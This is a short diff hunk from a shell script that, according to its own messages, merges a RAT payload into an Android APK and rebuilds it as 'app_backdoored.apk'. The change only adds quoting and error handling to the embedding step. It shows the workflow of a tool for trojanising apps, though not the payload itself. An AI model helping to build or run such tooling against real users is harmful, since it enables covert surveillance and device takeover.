@@ -4346,7 +4346,7 @@ echo "[*] Starting the merging process of RAT with the APK you selected"
 echo -e $okegreen ""
 
 #Starting the process of inserting the payload into original apk file
-ruby $apkembed $path/temp/app.apk
+ruby "$apkembed" "$path/temp/app.apk" || exit 1
 apktool b $encd -o app_backdoored.apk temp/original
 sleep 2
 
